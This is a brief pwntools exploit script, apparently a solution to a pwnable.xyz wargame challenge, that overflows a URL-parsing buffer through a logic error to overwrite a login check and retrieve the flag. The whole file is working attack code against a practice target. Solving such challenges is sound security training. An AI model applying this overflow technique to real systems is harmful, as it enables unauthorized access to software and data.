from pwn import *

###Util
def create(protocol,size,data):
    r.sendlineafter('> ','2')
    r.sendafter('insecure: ',protocol)
    r.sendafter('url: ',str(size).ljust(0x20,'a'))
    r.send(data)

def get_flag():
    r.sendlineafter('> ','4')

###Exploit
r = remote('svc.pwnable.xyz',30021)
###BOF with logic error into login check buf
for i in range(3):
    create('https',0x7f,':'*0x7f)
###Get flag
get_flag()
r.interactive()
